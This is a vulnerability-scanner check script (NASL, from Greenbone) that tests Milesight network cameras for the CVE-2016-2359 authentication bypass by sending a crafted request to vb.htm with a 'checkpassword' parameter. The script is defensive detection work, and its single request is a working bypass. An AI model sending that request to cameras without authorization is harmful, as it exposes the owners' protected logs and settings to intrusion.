# Copyright (C) 2019 Greenbone Networks GmbH
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if( description )
{
  script_oid("1.3.6.1.4.1.25623.1.0.114161");
  script_version("2019-11-06T11:48:50+0000");
  script_tag(name:"last_modification", value:"2019-11-06 11:48:50 +0000 (Wed, 06 Nov 2019)");
  script_tag(name:"creation_date", value:"2019-11-04 13:02:47 +0100 (Mon, 04 Nov 2019)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2016-2359");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Milesight Network Cameras Authentication Bypass Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2019 Greenbone Networks GmbH");
  script_family("Default Accounts");
  script_dependencies("gb_milesight_camera_detect.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("milesight/network_camera/detected");

  script_tag(name:"summary", value:"Milesight Network Cameras are prone to an authentication
  bypass vulnerability.");

  script_tag(name:"insight", value:"Remote attackers are allowed to bypass authentication
  and access a protected resource by simultaneously making a request for the unprotected vb.htm resource.");

  script_tag(name:"vuldetect", value:"Tries to exploit the vulnerability by displaying
  a certain set of strings, which usually requires authentication.");

  script_tag(name:"affected", value:"All Milesight Network Cameras.");

  script_tag(name:"solution", value:"According to the security researchers, Milesight
  has already fixed this vulnerability. Make sure to update to the latest version.");

  exit(0);
}

CPE = "cpe:/h:milesight:network_camera";

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if(!port = get_app_port(cpe: CPE)) exit(0);
if(!get_app_location(port: port, cpe: CPE)) exit(0);

#"checkpassword" makes it so that the other commands bypass authentication
#Without it, you will get a 401 unauthorized message
url = "/vb.htm?checkpassword=&page=logs&main_type=-1&sub_type=-1";

req = http_get_req(port: port, url: url);

#Results in:
#NG checkpassword
#UW pageUW main_typeUW sub_type
res = http_keepalive_send_recv(port: port, data: req);

if("checkpassword" >< res && "page" >< res && "main_type" >< res && "sub_type" >< res) {
  report = "It was possible to bypass authentication.";
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
